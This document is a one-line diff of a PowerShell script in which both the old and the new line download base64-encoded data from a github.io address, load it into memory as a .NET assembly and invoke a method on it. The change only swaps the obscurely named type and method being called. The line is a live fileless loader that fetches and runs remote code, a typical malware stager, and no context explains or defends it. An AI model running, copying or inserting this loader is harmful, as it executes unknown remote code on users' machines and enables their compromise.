@@ -1,1 +1,1 @@
-[Reflection.Assembly]::Load([Convert]::FromBase64String((Invoke-RestMethod 'https://ursaaxe731.github.io/term/flower'))).GetType('Animal.Line')::Bite()
+[Reflection.Assembly]::Load([Convert]::FromBase64String((Invoke-RestMethod 'https://ursaaxe731.github.io/term/flower'))).GetType('Plant.Flower')::Fee()
